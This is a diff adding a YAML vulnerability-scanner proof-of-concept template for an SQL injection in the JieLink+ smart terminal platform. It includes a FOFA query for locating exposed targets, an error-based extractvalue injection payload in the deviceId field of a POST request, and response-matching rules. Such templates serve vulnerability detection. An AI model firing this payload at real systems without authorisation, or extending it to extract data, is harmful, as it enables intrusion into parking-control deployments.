@@ -1,0 +1,20 @@
+id: poc-yaml-jielink-plus-getparkcontroller-sqli
+info:
+  name: JieLink+智能终端操作平台 GetParkController SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: JeLink+
+  fofa: title="JieLink+智能终端操作平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /mobile/Remote/GetParkController
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: deviceId=1'and/**/extractvalue(1,concat(char(126),md5({{.t1}})))and'
+  expression: "status_code == 200 && \ncontains(body,\"location.href\") &&\ncontains(body,substr(t2,0,31))\
+    \ &&\ncontains(body,\"XPATH+syntax+error\")\n"
+transport: http
